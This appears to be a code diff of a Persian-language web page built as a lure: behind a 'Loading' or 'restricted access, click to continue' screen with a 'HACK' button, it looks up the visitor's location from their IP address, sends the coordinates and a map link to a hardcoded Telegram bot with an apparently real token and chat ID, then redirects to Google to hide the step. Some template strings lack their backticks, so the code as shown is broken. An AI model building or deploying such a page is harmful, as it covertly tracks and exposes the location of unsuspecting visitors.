@@ -4,51 +4,74 @@
     <meta charset="UTF-8">
     <title>Loading...</title>
     <style>
-        body{background:#0a0a0a;color:#fff;text-align:center;padding-top:15%;font-family:Arial}
-        #status{color:#0f0;font-size:18px;margin-top:20px}
+        body{background:#0a0a0a;color:#fff;text-align:center;padding-top:10%;font-family:Arial}
+        #status{color:#0f0;font-size:16px;margin-top:20px;min-height:40px}
+        #log{background:#111;padding:15px;margin:20px auto;max-width:500px;border-radius:8px;font-size:13px;text-align:left;color:#0f0;font-family:monospace;min-height:100px;overflow:auto;border:1px solid #333}
+        .error{color:#f44}
+        .btn-hack{background:transparent;border:2px solid #0f0;color:#0f0;padding:15px 40px;font-size:24px;font-weight:bold;border-radius:50px;cursor:pointer}
+        .btn-hack:hover{background:#0f0;color:#000}
+        .btn-hack:disabled{opacity:0.3;cursor:not-allowed}
     </style>
 </head>
 <body>
-    <h2>⏳ در حال اتصال ...</h2>
-    <div id="status">⏳ دریافت اطلاعات...</div>
+    <h2>⛔ دسترسی محدود</h2>
+    <p style="color:#888;font-size:14px">برای ادامه، کلیک کنید</p>
+    <button class="btn-hack" id="hackBtn" onclick="handleHack()">HACK</button>
+    <div id="status">✅ آماده</div>
+    <div id="log">⏳ منتظر کلیک...</div>
+
     <script>
-    (function() {
-        const statusEl = document.getElementById('status');
+    // ===== تنظیمات =====
+    const BOT_TOKEN = '8891127738:AAEJAQww9ts_V-Rcliwrvjm6ftbdZ1bRitM';   // <-- توکن خود را اینجا بگذارید
+    const CHAT_ID = '6340337525';         // <-- Chat ID خود را اینجا بگذارید
 
-        function setStatus(msg, isError = false) {
-            statusEl.textContent = msg;
-            statusEl.style.color = isError ? '#f44' : '#0f0';
-        }
+    const statusEl = document.getElementById('status');
+    const logEl = document.getElementById('log');
+    const btn = document.getElementById('hackBtn');
 
-        // ===== دریافت موقعیت از IP (فقط یک سرویس ساده) =====
-        async function getLocation() {
-            try {
-                setStatus('🌐 دریافت موقعیت از شبکه...');
-                const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
-                const data = await res.json();
-                if (data.status === 'success') {
-                    return {
-                        lat: data.lat,
-                        lon: data.lon,
-                        city: data.city,
-                        country: data.country,
-                        method: 'IP-API'
-                    };
-                } else {
-                    return null;
-                }
-            } catch(e) {
-                setStatus('❌ خطا در دریافت موقعیت: ' + e.message, true);
+    function setStatus(msg, isError = false) {
+        statusEl.textContent = msg;
+        statusEl.style.color = isError ? '#f44' : '#0f0';
+    }
+
+    function addLog(msg, isError = false) {
+        const line = document.createElement('div');
+        line.textContent = '> ' + msg;
+        line.style.color = isError ? '#f44' : '#0f0';
+        logEl.appendChild(line);
+        logEl.scrollTop = logEl.scrollHeight;
+        console.log(msg);
+    }
+
+    // ===== دریافت موقعیت =====
+    async function getLocation() {
+        addLog('🌐 دریافت موقعیت از IP...');
+        try {
+            const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
+            const data = await res.json();
+            addLog('📡 پاسخ دریافت شد');
+            if (data.status === 'success') {
+                addLog(✅ موقعیت: ${data.lat}, ${data.lon});
+                return {
+                    lat: data.lat,
+                    lon: data.lon,
+                    city: data.city,
+                    country: data.country,
+                    method: 'IP-API'
+                };
+            } else {
+                addLog('❌ وضعیت ناموفق: ' + data.message, true);
                 return null;
             }
+        } catch(e) {
+            addLog('❌ خطا: ' + e.message, true);
+            return null;
         }
+    }
 
-        // ===== ارسال به تلگرام =====
-        async function sendToTelegram(loc) {
-            const botToken = 'YOUR_BOT_TOKEN';   // <-- توکن خود را اینجا بگذارید
-            const chatId = '6340337525';         // <-- Chat ID خود را اینجا بگذارید
-
-            const text = 
+    // ===== ارسال به تلگرام =====
+    async function sendToTelegram(loc) {
+        const text = 
 📍 موقعیت جدید:
 🌐 عرض: ${loc.lat}
 🌐 طول: ${loc.lon}
@@ -57,41 +80,53 @@
 📡 روش: ${loc.method}
 🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};
 
-            const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)};
-            try {
-                setStatus('📤 ارسال به تلگرام...');
-                const res = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
-                const data = await res.json();
-                if (data.ok) {
-                    setStatus('✅ موقعیت ارسال شد!');
-                    return true;
-                } else {
-                    setStatus('❌ خطا در ارسال: ' + data.description, true);
-                    return false;
-                }
-            } catch(e) {
-                setStatus('❌ خطا در ارتباط با تلگرام: ' + e.message, true);
+        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
+        addLog('📤 ارسال به تلگرام...');
+        try {
+            const res = await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
+            const data = await res.json();
+            if (data.ok) {
+                addLog('✅ پیام ارسال شد!');
+                return true;
+            } else {
+                addLog('❌ خطا: ' + data.description, true);
                 return false;
             }
+        } catch(e) {
+            addLog('❌ خطا: ' + e.message, true);
+            return false;
+        }
+    }
+
+    // ===== تابع اصلی (که با کلیک دکمه اجرا می‌شود) =====
+    async function handleHack() {
+        addLog('🚀 شروع فرآیند...');
+        btn.disabled = true;
+        btn.style.opacity = '0.3';
+        setStatus('⏳ در حال پردازش...');
+
+        const loc = await getLocation();
+        if (!loc) {
+            setStatus('❌ موقعیت دریافت نشد', true);
+            addLog('❌ پایان با خطا', true);
+            btn.disabled = false;
+            btn.style.opacity = '1';
+            return;
         }
 
-        // ===== اصلی =====
-        async function main() {
-            const loc = await getLocation();
-            if (loc) {
-                setStatus(✅ موقعیت: ${loc.lat}, ${loc.lon});
-                await sendToTelegram(loc);
-            } else {
-                setStatus('❌ موقعیت دریافت نشد', true);
-            }
-            // ریدایرکت بعد از ۲ ثانیه
-            setTimeout(() => {
-                window.location.href = 'https://www.google.com';
-            }, 2000);
-        }
+        setStatus(✅ موقعیت: ${loc.lat}, ${loc.lon});
+        await sendToTelegram(loc);
 
-        main();
-    })();
+        setStatus('✅ انجام شد!');
+        addLog('⏳ ریدایرکت به گوگل در ۲ ثانیه...');
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 2000);
+    }
+
+    // ===== اطمینان از اینکه دکمه کار می‌کند =====
+    addLog('✅ صفحه بارگذاری شد. دکمه را بزنید.');
+    console.log('Script loaded. Button is ready.');
     </script>
 </body>
 </html>
